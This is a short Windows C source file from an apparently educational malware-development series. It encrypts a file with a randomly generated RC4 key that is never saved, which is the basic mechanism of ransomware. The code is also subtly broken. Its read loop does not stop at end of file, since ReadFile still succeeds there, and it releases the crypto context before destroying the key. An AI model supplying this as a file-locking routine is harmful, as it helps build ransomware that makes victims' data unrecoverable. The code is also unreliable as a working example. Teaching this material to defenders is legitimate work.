/*
 * Malware Development for Ethical Hackers
 * hack5.c
 * file encryption example
 * author: @cocomelonc
*/
#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

void encrypt_file(LPCWSTR filename) {
  // buffer to hold the plaintext and the ciphertext
  BYTE buffer[1024];
  DWORD bytesRead, bytesWritten;

  // open the original file, and create the new file
  HANDLE originalFile = CreateFile(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  HANDLE newFile = CreateFile(L"encrypted", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

  // Get a handle to the CSP
  HCRYPTPROV hProv;
  CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);

  // Generate the session key
  HCRYPTKEY hKey;
  CryptGenKey(hProv, CALG_RC4, CRYPT_EXPORTABLE, &hKey);

  // Read the plaintext file, encrypt the buffer, then write to the new file
  while(ReadFile(originalFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
    CryptEncrypt(hKey, 0, bytesRead < sizeof(buffer), 0, buffer, &bytesRead, sizeof(buffer));
    WriteFile(newFile, buffer, bytesRead, &bytesWritten, NULL);
  }

  // Clean up
  CryptReleaseContext(hProv, 0);
  CryptDestroyKey(hKey);
  CloseHandle(originalFile);
  CloseHandle(newFile);
}

int main() {
  encrypt_file(L"test.txt");
  return 0;
}
